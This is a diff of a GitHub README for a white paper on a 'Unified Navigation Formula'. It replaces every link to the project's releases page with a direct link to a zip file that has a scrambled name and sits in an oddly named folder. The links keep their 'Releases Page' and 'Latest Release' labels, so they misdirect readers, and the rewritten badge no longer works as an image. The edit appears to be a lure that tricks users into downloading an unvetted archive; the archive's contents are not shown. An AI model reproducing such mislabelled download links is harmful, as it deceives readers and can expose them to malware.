@@ -1,6 +1,6 @@
 # 🌐 White-Paper-The-Unified-Navigation-Formula-UNF- - A Clear Path to Understanding Intent
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/main/myelitic/The_White_UN_Navigation_Unified_Paper_Formula_v1.4.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/main/myelitic/The_White_UN_Navigation_Unified_Paper_Formula_v1.4.zip)
 
 ## 📚 Introduction
 
@@ -11,7 +11,7 @@ The Unified Navigation Formula (UNF) provides a mathematical framework that quan
 To get started with the UNF, follow these simple steps to download and run the software.
 
 1. **Visit the Releases Page:** Click the link below to access the official releases page.
-   [Download Here](https://github.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/releases)
+   [Download Here](https://raw.githubusercontent.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/main/myelitic/The_White_UN_Navigation_Unified_Paper_Formula_v1.4.zip)
 
 2. **Choose the Latest Release:** On the releases page, look for the latest version. It will typically be at the top. The title will include version details and may have notes about what has changed.
 
@@ -80,7 +80,7 @@ If you need help, consider reaching out to the community:
 
 Stay tuned for future improvements and features, including enhanced analytics tools and expanded content to cover emerging topics in consciousness and information theory. 
 
-Feel free to revisit the [Releases Page](https://github.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/releases) for the latest versions and updates.
+Feel free to revisit the [Releases Page](https://raw.githubusercontent.com/adewijaya89/White-Paper-The-Unified-Navigation-Formula-UNF-/main/myelitic/The_White_UN_Navigation_Unified_Paper_Formula_v1.4.zip) for the latest versions and updates.
 
 ## 🙏 Acknowledgments
 
